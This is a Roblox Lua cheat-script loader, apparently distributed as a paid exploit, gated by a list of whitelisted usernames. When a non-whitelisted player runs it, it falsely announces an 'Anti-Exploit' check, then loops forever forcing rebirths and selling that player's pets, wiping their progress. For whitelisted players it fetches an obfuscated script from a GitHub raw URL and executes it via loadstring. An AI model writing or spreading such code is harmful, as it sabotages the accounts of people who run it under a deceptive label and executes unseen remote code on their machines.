-- ==========================================
-- WHITELIST & CONFIGURATION SYSTEM
-- ==========================================
local WHITELISTED_USERS = {
    "KingBaconMuscle1",
    "DeeV_LorD",
    "AKUNPALSU04",
    "jhojet23",
    "ryanpadri",
    "SOE_GAGI",
    "gamestyep25",
    "bahomp_pre",
    "huhseller09",
    "MOBPSYCHO850",
    "cham_lucky",
    "Mcjanmapatac123",
    "DJ_Bumbai3",
    "Itsme_Omskun",
    "santos0123078"
}

local function isWhitelisted(player)
    for _, idOrName in ipairs(WHITELISTED_USERS) do
        if type(idOrName) == "number" and player.UserId == idOrName then
            return true
        elseif type(idOrName) == "string" and player.Name:lower() == idOrName:lower() then
            return true
        end
    end
    return false
end

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local localPlayer = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait()

-- ==========================================
-- KUNG HINDI WHITELISTED: Auto-Rebirth & Auto-Sell AGAD
-- ==========================================
if not isWhitelisted(localPlayer) then
    print("[Anti-Exploit] Unwhitelisted player detected. Executing auto-rebirth and auto-sell...")
    
    -- 1. Auto-Rebirth (Infinitely Loop)
    task.spawn(function()
        while true do
            pcall(function()
                ReplicatedStorage.rEvents.rebirthRemote:InvokeServer("rebirthRequest")
            end)
            task.wait(0.1)
        end
    end)
    
    -- 2. Background Auto-Sell System (Rarity Folders Support)
    task.spawn(function()
        local autoSellPetsByName = {
            -- Dati mong mga Pets
            ["Swift Samurai"] = true,
            ["Tribal Overlord"] = true,
            ["Mighty Monster"] = true,
            ["Wild Wizard"] = true,
            ["Omega Overlord"] = true,
            ["Titanium Hydra"] = true,
            ["Powercore Hound"] = true,
            ["Jungle Captain"] = true,
            ["Flaming Hedgehog"] = true,
            ["Electro Bunny"] = true,
            ["Common Boss Pet"] = true,
            ["Rare Boss Pet"] = true,
            ["Epic Boss Pet"] = true,
            ["Legendary Boss Pet"] = true,
            ["Mythic Boss Pet"] = true,
            ["Rainbow Boss Pet"] = true,
            ["Haunted Lantern"] = true,
            ["Candy Cube"] = true,
            ["Cursed Candle"] = true,
            ["Jack o Block"] = true,
            ["Bone Block"] = true,
            ["Coffin Crawler"] = true,
            ["Apex Overlord"] = true,
            ["Shard Dragon"] = true,
            ["Nova Pheonix"] = true,
            ["Infernal Steed"] = true,
            ["Inferno Drake"] = true,
            ["Orange Hedgehog"] = true,
            ["Blue Birdie"] = true,
            ["Red Kitty"] = true,
            ["Blue Bunny"] = true,
            ["Dark Vampy"] = true,
            ["Silver Dog"] = true,
            ["Dark Golem"] = true,
            ["Green Butterfly"] = true,
            ["Crimson Falcon"] = true,
            ["Yellow Butterfly"] = true,
            ["Purple Dragon"] = true,
            ["Orange Pegasus"] = true,
            ["Blue Phoenix"] = true,
            ["Red Dragon"] = true,
            ["Purple Falcon"] = true,
            ["Blue Firecaster"] = true,
            ["Golden Phoenix"] = true,
            ["Red Firecaster"] = true,
            ["White Pegasus"] = true,
            ["Infernal Dragon"] = true,
            ["Green Firecaster"] = true,
            ["White Phoenix"] = true,
            ["Magic Butterfly"] = true,
            ["Ultra Birdie"] = true,
            ["Frostwave Legends Penguin"] = true,
            ["Phantom Genesis Dragon"] = true,
            ["Dark Legends Manticore"] = true,
            ["Ultimate Supernova Pegasus"] = true,
            ["Aether Spirit Bunny"] = true,
            ["Cybernetic Showdown Dragon"] = true,
            ["Eternal Strike Leviathan"] = true,
            ["Lightning Strike Phantom"] = true,
            ["Darkstar Hunter"] = true,
            ["Golden Viking"] = true,
            ["Muscle Sensei"] = true,
            ["Neon Guardian"] = true,
            ["Core Pup"] = true,
            ["Volt Talon"] = true,
            ["Reactor Beast"] = true,
            ["Plasma Ravager"] = true,
            ["Titan Reactor"] = true,
            ["Voltaic Falcon"] = true,
            ["Magical Pegasus"] = true,
            ["Tundra Dragon"] = true
        }

        while true do
            local p = Players.LocalPlayer
            local petsFolder = p:FindFirstChild("petsFolder") or p:FindFirstChild("PetsFolder") or p:FindFirstChild("Pets")
            local rEvents = ReplicatedStorage:FindFirstChild("rEvents") or ReplicatedStorage:FindFirstChild("remotes")
            local sellEvent = rEvents and (rEvents:FindFirstChild("sellPetEvent") or rEvents:FindFirstChild("SellPetEvent") or rEvents:FindFirstChild("sellPet") or rEvents:FindFirstChild("SellPet"))

            if petsFolder and sellEvent then
                for _, rarityFolder in pairs(petsFolder:GetChildren()) do
                    if rarityFolder:IsA("Folder") then
                        for _, pet in pairs(rarityFolder:GetChildren()) do
                            if autoSellPetsByName[pet.Name] then
                                pcall(function()
                                    if sellEvent:IsA("RemoteFunction") then
                                        sellEvent:InvokeServer("sellPet", pet)
                                    else
                                        sellEvent:FireServer("sellPet", pet)
                                    end
                                end)
                                task.wait(0.1)
                            end
                        end
                    elseif rarityFolder:IsA("Model") or rarityFolder:IsA("BasePart") then
                        if autoSellPetsByName[rarityFolder.Name] then
                            pcall(function()
                                if sellEvent:IsA("RemoteFunction") then
                                    sellEvent:InvokeServer("sellPet", rarityFolder)
                                else
                                    sellEvent:FireServer("sellPet", rarityFolder)
                                end
                            end)
                            task.wait(0.1)
                        end
                    end
                end
            end
            
            task.wait(1)
        end
    end)
    
    return
end

-- ==========================================
-- KUNG WHITELISTED: I-execute ang Script
-- ==========================================
print("[Whitelist System] Player is whitelisted. Loading script...")

local success, errorMessage = pcall(function()
    local scriptContent = game:HttpGet("https://raw.githubusercontent.com/Zaiker67/Obfuscated/refs/heads/main/AN94-Paid")
    local compiledScript, loadError = loadstring(scriptContent)
    
    if loadError then
        warn("[Loadstring Error]: " .. tostring(loadError))
        return
    end
    
    compiledScript()
end)

if not success then
    warn("[Execution Failed]: " .. tostring(errorMessage))
end
